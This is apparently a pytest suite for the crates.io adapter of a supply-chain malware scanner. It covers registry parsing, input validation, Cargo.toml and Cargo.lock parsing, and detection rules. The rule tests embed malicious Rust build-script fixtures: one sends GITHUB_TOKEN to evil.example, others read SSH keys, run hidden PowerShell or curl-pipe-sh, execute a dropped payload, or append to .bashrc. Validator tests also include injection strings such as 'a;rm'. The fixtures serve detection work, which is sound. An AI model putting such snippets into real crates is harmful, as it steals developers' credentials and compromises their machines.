"""cargo 어댑터 — 레지스트리 파싱(오프라인 MockTransport)·검증·규칙·매니페스트·피드."""

from __future__ import annotations

import asyncio

import httpx
import pytest

import ecosystems
from ecosystems.base import PackageNotFound, RegistryError
from engine.rules.base import MemoryTree

ADAPTER = ecosystems.get("cargo")

CRATE_JSON = {
    "crate": {"id": "demo", "name": "demo", "max_version": "1.2.0", "max_stable_version": "1.2.0",
              "repository": "https://github.com/x/demo", "description": "d", "downloads": 5},
    "versions": [
        {"num": "1.2.0", "created_at": "2026-05-02T10:00:00.000000Z", "yanked": False,
         "crate_size": 1234, "checksum": "ab" * 32, "published_by": {"login": "alice"}},
        {"num": "1.1.0", "created_at": "2026-04-01T10:00:00.000000Z", "yanked": True,
         "crate_size": 1000, "checksum": "cd" * 32, "published_by": None},
        {"num": "1.0.0", "created_at": "2026-03-01T10:00:00.000000Z", "yanked": False,
         "crate_size": 900, "checksum": "ef" * 32, "published_by": {"login": "bob"}},
    ],
}


def _client(handler) -> httpx.AsyncClient:
    return httpx.AsyncClient(transport=httpx.MockTransport(handler))


def run(coro):
    return asyncio.run(coro)


# ── 레지스트리 ────────────────────────────────────────────────────

def test_fetch_project_parses_metadata_and_sends_user_agent():
    seen = {}

    def handler(req: httpx.Request) -> httpx.Response:
        seen["ua"] = req.headers["user-agent"]
        seen["path"] = req.url.path
        return httpx.Response(200, json=CRATE_JSON)

    async def go():
        async with _client(handler) as c:
            return await ADAPTER.fetch_project("demo", client=c)

    p = run(go())
    assert seen == {"ua": "supply-unchained-scanner", "path": "/api/v1/crates/demo"}
    assert p.ecosystem == "cargo" and p.latest == "1.2.0"
    assert p.repository_url == "https://github.com/x/demo"
    assert p.maintainers == ["alice", "bob"]
    assert p.releases["1.1.0"].yanked is True
    art = ADAPTER.select_artifacts(p, "1.2.0")[0]
    assert art.url == "https://static.crates.io/crates/demo/demo-1.2.0.crate"
    assert art.kind == "crate" and art.archive_format == "tar" and art.sha256 == "ab" * 32
    # yanked 는 직전 버전 후보에서 제외된다
    assert p.previous_version("1.2.0") == "1.0.0"


def test_fetch_project_not_found_message():
    async def go():
        async with _client(lambda r: httpx.Response(404, json={"errors": []})) as c:
            await ADAPTER.fetch_project("nope", client=c)

    with pytest.raises(PackageNotFound, match=r"nope is not on crates\.io \(never existed, or removed\)"):
        run(go())


@pytest.mark.parametrize("resp", [httpx.Response(500), httpx.Response(200, text="<html>"),
                                  httpx.Response(200, json={"x": 1})])
def test_fetch_project_errors_are_registry_errors(resp):
    async def go():
        async with _client(lambda r: resp) as c:
            await ADAPTER.fetch_project("demo", client=c)

    with pytest.raises(RegistryError) as ei:
        run(go())
    assert not isinstance(ei.value, PackageNotFound)


def test_fetch_project_network_error():
    def boom(req):
        raise httpx.ConnectError("down")

    async def go():
        async with _client(boom) as c:
            await ADAPTER.fetch_project("demo", client=c)

    with pytest.raises(RegistryError):
        run(go())


# ── 검증 ──────────────────────────────────────────────────────────

@pytest.mark.parametrize("name,ver", [("serde", "1.0.0"), ("serde_json", "1.0.0-rc.1"),
                                      ("tokio-util", "0.7.1+build.5"), ("a", "0.0.1")])
def test_validate_accepts(name, ver):
    ADAPTER.validate(name, ver)


@pytest.mark.parametrize("name,ver", [
    ("", "1.0.0"), ("1abc", "1.0.0"), ("a b", "1.0.0"), ("a;rm", "1.0.0"), ("../x", "1.0.0"),
    ("a/b", "1.0.0"), ("x" * 65, "1.0.0"), ("serde", "1.0"), ("serde", "v1.0.0"),
    ("serde", "1.0.0 "), ("serde", "1.0.0;ls"), ("serde", "01.0.0"), ("serde", "1.0.0/../x"),
])
def test_validate_rejects(name, ver):
    with pytest.raises(ValueError):
        ADAPTER.validate(name, ver)


def test_identity_helpers():
    assert ADAPTER.normalize_name("Serde_Json") == "serde-json"
    assert ADAPTER.purl("serde", "1.0.0") == "pkg:cargo/serde@1.0.0"
    assert (ADAPTER.osv_ecosystem, ADAPTER.purl_type, ADAPTER.registry_label) == (
        "crates.io", "cargo", "crates.io")
    assert ADAPTER.web_url("serde", "1.0.0").startswith("https://docs.rs/")


# ── 규칙 ──────────────────────────────────────────────────────────

def crate(build: str | None, manifest: str = "", extra: dict[str, str] | None = None,
          *, proc_macro: bool = False) -> MemoryTree:
    toml = '[package]\nname = "demo"\nversion = "1.0.0"\n' + manifest
    if proc_macro:
        toml += "\n[lib]\nproc-macro = true\n"
    files = {"demo-1.0.0/Cargo.toml": toml, "demo-1.0.0/src/lib.rs": "pub fn f() {}"}
    if build is not None:
        files["demo-1.0.0/build.rs"] = build
    for k, v in (extra or {}).items():
        files[f"demo-1.0.0/{k}"] = v
    return MemoryTree(files)


def rules_of(tree: MemoryTree) -> dict[str, str]:
    return {f.rule: f.severity.value for f in ADAPTER.analyze_tree(tree)}


ORDINARY_BUILD = """
use std::env;
use std::process::Command;
fn main() {
    println!("cargo:rerun-if-changed=build.rs");
    let out = env::var("OUT_DIR").unwrap();
    let cc = env::var("CC").unwrap_or_else(|_| "cc".into());
    let st = Command::new("pkg-config").arg("--libs").arg("openssl").status().unwrap();
    Command::new("git").args(["describe", "--tags"]).output().ok();
    Command::new("cmake").arg("-S").arg(".").status().unwrap();
    cc::Build::new().file("src/x.c").compile("x");
    // curl https://example.com | sh  <- 주석이라 무시된다
}
"""


def test_ordinary_build_script_is_clean():
    assert rules_of(crate(ORDINARY_BUILD)) == {}


def test_no_build_script_is_clean():
    assert rules_of(crate(None)) == {}


def test_credentials_plus_network_is_high():
    src = """
use std::env;
fn main() {
    let t = env::var("GITHUB_TOKEN").unwrap_or_default();
    let _ = ureq::post("https://evil.example/c").send_string(&t);
}
"""
    f = ADAPTER.analyze_tree(crate(src))
    assert f[0].rule == "cargo-build-exfil" and f[0].severity.value == "high"
    assert f[0].location.startswith("demo-1.0.0/build.rs:")


def test_ssh_key_file_plus_tcp_is_high():
    src = 'fn main(){ let k = std::fs::read(format!("{}/.ssh/id_rsa", h)); std::net::TcpStream::connect("a:1"); }'
    assert rules_of(crate(src))["cargo-build-exfil"] == "high"


def test_powershell_command_is_high():
    src = 'fn main(){ std::process::Command::new("powershell").args(["-WindowStyle","Hidden","-enc","AAAA"]).spawn(); }'
    assert rules_of(crate(src))["cargo-build-suspicious-command"] == "high"


def test_curl_pipe_sh_via_shell_is_high():
    src = 'use std::process::Command; fn main(){ Command::new("sh").arg("-c").arg("curl -s http://x.y/z | sh").status(); }'
    r = rules_of(crate(src))
    assert r["cargo-build-suspicious-command"] == "high"


def test_payload_decode_write_exec_is_high():
    src = """
use std::process::Command;
fn main() {
    let blob = include_bytes!("payload.bin");
    std::fs::write("/tmp/.x", blob).unwrap();
    Command::new("/tmp/.x").spawn().unwrap();
}
"""
    assert rules_of(crate(src))["cargo-build-payload-exec"] == "high"


def test_persistence_is_high():
    src = 'fn main(){ let mut f = std::fs::OpenOptions::new().append(true).open("/home/u/.bashrc").unwrap(); }'
    assert rules_of(crate(src))["cargo-build-persistence"] == "high"


def test_webhook_literal_is_high():
    hook = "https://discord.com/api/webhooks/123456789012345678/" + "A" * 40
    assert rules_of(crate(f'fn main(){{ let u = "{hook}"; }}'))["cargo-exfil-endpoint"] == "high"


def test_raw_public_ip_with_network_is_high_but_private_is_not():
    pub = 'fn main(){ ureq::get("http://45.33.12.9/x").call(); }'
    assert rules_of(crate(pub))["cargo-exfil-endpoint"] == "high"
    priv = 'fn main(){ ureq::get("http://192.168.1.5/x").call(); }'
    assert rules_of(crate(priv)) == {"cargo-build-network": "medium"}


def test_download_only_is_medium_not_high():
    # ort 류: 사전 빌드 바이너리를 받는 정상 패턴
    src = 'fn main(){ let r = ureq::get("https://github.com/x/y/releases/a.tgz").call(); }'
    assert rules_of(crate(src)) == {"cargo-build-network": "medium"}


def test_unusual_program_is_medium():
    src = 'fn main(){ std::process::Command::new("mytool").status(); }'
    assert rules_of(crate(src)) == {"cargo-build-spawn": "medium"}


def test_module_included_by_build_script_is_scanned():
    tree = crate("mod helper;\nfn main(){ helper::go(); }",
                 extra={"helper.rs": 'pub fn go(){ std::process::Command::new("powershell").arg("-enc").status(); }'})
    assert rules_of(tree)["cargo-build-suspicious-command"] == "high"


def test_custom_build_path_is_followed():
    tree = crate(None, manifest='build = "builder/main.rs"\n',
                 extra={"builder/main.rs": 'fn main(){ std::process::Command::new("mshta").status(); }'})
    r = rules_of(tree)
    assert r["cargo-build-suspicious-command"] == "high"
    assert "cargo-manifest-build-path" not in r  # builder/main.rs 는 평범한 경로


def test_odd_build_path_flagged():
    tree = crate(None, manifest='build = "../x.rs"\n')
    assert rules_of(tree)["cargo-manifest-build-path"] == "medium"


def test_build_false_disables_script():
    tree = crate('fn main(){ std::process::Command::new("powershell"); }',
                 manifest="build = false\n")
    assert rules_of(tree) == {}


def test_git_dependency_flagged():
    tree = crate(None, manifest='[dependencies]\nfoo = { git = "https://github.com/a/b" }\n')
    assert rules_of(tree) == {"cargo-manifest-git-dependency": "medium"}


def test_proc_macro_network_and_exfil():
    src = """
use proc_macro::TokenStream;
#[proc_macro]
pub fn m(_: TokenStream) -> TokenStream {
    let t = std::env::var("AWS_SECRET_ACCESS_KEY").unwrap();
    std::net::TcpStream::connect("1.2.3.4:80").unwrap();
    TokenStream::new()
}
"""
    f = ADAPTER.analyze_tree(crate(None, extra={"src/lib.rs": src}, proc_macro=True))
    assert any(x.rule == "cargo-proc-macro-sideeffect" and x.severity.value == "high" for x in f)


def test_regular_crate_source_is_not_scanned_for_network():
    # proc-macro 가 아닌 크레이트의 src 는 빌드 시 실행되지 않는다 — reqwest 를 써도 정상
    src = 'pub fn get(){ reqwest::get("https://x"); std::net::TcpStream::connect("a:1"); }'
    assert rules_of(crate(None, extra={"src/lib.rs": src})) == {}


def test_proc_macro_ordinary_is_clean():
    src = "use proc_macro::TokenStream;\n#[proc_macro]\npub fn m(i: TokenStream) -> TokenStream { i }"
    assert rules_of(crate(None, extra={"src/lib.rs": src}, proc_macro=True)) == {}


def test_strings_with_comment_markers_not_truncated():
    # "http://" 의 // 를 주석으로 오인해 뒤를 지우면 웹훅을 놓친다
    hook = "https://discord.com/api/webhooks/123456789012345678/" + "B" * 40
    src = f'fn main(){{ let u = "{hook}"; // trailing\n}}'
    assert "cargo-exfil-endpoint" in rules_of(crate(src))


def test_unreadable_and_oversized_files_reported():
    class Broken(MemoryTree):
        def read(self, relpath):
            return None if relpath.endswith("build.rs") else super().read(relpath)

    t = Broken(crate("fn main(){}")._data)
    assert rules_of(t) == {"cargo-unreadable-file": "medium"}


def test_invalid_manifest_reported():
    t = MemoryTree({"c-1/Cargo.toml": "[package\nname=", "c-1/build.rs": "fn main(){}"})
    assert "cargo-manifest-invalid" in rules_of(t)


def test_not_a_crate_returns_nothing():
    assert ADAPTER.analyze_tree(MemoryTree({"README.md": "hi"})) == []


def test_findings_sorted_and_cwes_registered():
    src = ('fn main(){ std::process::Command::new("mytool").status();'
           ' std::process::Command::new("mshta").status(); }')
    f = ADAPTER.analyze_tree(crate(src))
    assert [x.severity.value for x in f] == sorted([x.severity.value for x in f],
                                                   key=["critical", "high", "medium", "low"].index)
    cwes = ADAPTER.rule_cwes()
    for x in f:
        assert x.cwe in cwes[x.rule]
    assert all(r.startswith("cargo-") for r in cwes)


def test_has_install_script():
    p = None
    assert ADAPTER.has_install_script(p, "1", ["demo-1/build.rs", "demo-1/Cargo.toml"]) is True
    assert ADAPTER.has_install_script(p, "1", ["demo-1/build/main.rs"]) is True
    assert ADAPTER.has_install_script(p, "1", ["demo-1/src/lib.rs"]) is False


# ── 매니페스트 ────────────────────────────────────────────────────

LOCK = """
version = 3
[[package]]
name = "myapp"
version = "0.1.0"
dependencies = ["serde", "tokio 1.0.0 (registry+https://github.com/rust-lang/crates.io-index)"]

[[package]]
name = "serde"
version = "1.0.200"
source = "registry+https://github.com/rust-lang/crates.io-index"
checksum = "aa"
dependencies = ["serde_derive"]

[[package]]
name = "serde_derive"
version = "1.0.200"
source = "registry+https://github.com/rust-lang/crates.io-index"

[[package]]
name = "tokio"
version = "1.0.0"
source = "sparse+https://index.crates.io/"

[[package]]
name = "gitdep"
version = "0.1.0"
source = "git+https://github.com/a/b#abc"
"""


def test_parse_cargo_lock():
    deps = {d.name: d for d in ADAPTER.parse_manifest("proj/Cargo.lock", LOCK)}
    assert set(deps) == {"serde", "serde_derive", "tokio"}  # 워크스페이스·git 제외
    assert deps["serde"].version == "1.0.200" and deps["serde"].direct is True
    assert deps["serde_derive"].direct is False
    assert deps["tokio"].direct is True and deps["tokio"].ecosystem == "cargo"
    assert deps["serde"].source == "proj/Cargo.lock"


TOML = """
[package]
name = "app"
version = "0.1.0"

[dependencies]
serde = "1.0"
exact = "=2.3.4"
tokio = { version = "1", features = ["full"] }
renamed = { package = "real-name", version = "=0.5.0" }
local = { path = "../local" }
fromgit = { git = "https://github.com/a/b" }
ws = { workspace = true }

[dev-dependencies]
criterion = "0.5"

[build-dependencies]
cc = "=1.0.0"

[target.'cfg(windows)'.dependencies]
winapi = "0.3"
"""


def test_parse_cargo_toml():
    deps = {d.name: d for d in ADAPTER.parse_manifest("Cargo.toml", TOML)}
    assert set(deps) == {"serde", "exact", "tokio", "real-name", "criterion", "cc", "winapi"}
    assert deps["serde"].version is None and deps["serde"].spec == "1.0"
    assert deps["exact"].version == "2.3.4"
    assert deps["real-name"].version == "0.5.0"
    assert deps["cc"].version == "1.0.0"
    assert all(d.direct for d in deps.values())


def test_parse_manifest_invalid_and_unknown():
    with pytest.raises(ValueError):
        ADAPTER.parse_manifest("Cargo.lock", "[[package")
    assert ADAPTER.parse_manifest("package.json", "{}") == []


# ── 피드 ──────────────────────────────────────────────────────────

SUMMARY = {
    "new_crates": [{"name": "fresh", "newest_version": "0.1.0", "max_version": "0.1.0"}],
    "just_updated": [{"name": "serde", "newest_version": "1.0.230", "max_version": "1.0.230"},
                     {"name": "fresh", "newest_version": "0.1.0"}, {"nameless": 1}],
}


def test_feed_parses_and_dedups():
    async def go():
        async with _client(lambda r: httpx.Response(200, json=SUMMARY)) as c:
            return await ADAPTER.fetch_feed(c)

    items, errors = run(go())
    assert items == [("fresh", "0.1.0"), ("serde", "1.0.230")] and errors == []
    assert ADAPTER.has_feed


@pytest.mark.parametrize("resp", [httpx.Response(503), httpx.Response(200, text="x")])
def test_feed_errors_not_hidden(resp):
    async def go():
        async with _client(lambda r: resp) as c:
            return await ADAPTER.fetch_feed(c)

    items, errors = run(go())
    assert items == [] and errors


@pytest.mark.live
def test_live_serde_registry():
    async def go():
        async with httpx.AsyncClient(timeout=30, follow_redirects=True) as c:
            return await ADAPTER.fetch_project("serde", client=c)

    p = run(go())
    assert "1.0.0" in p.releases and p.latest

# ruff: noqa: E501
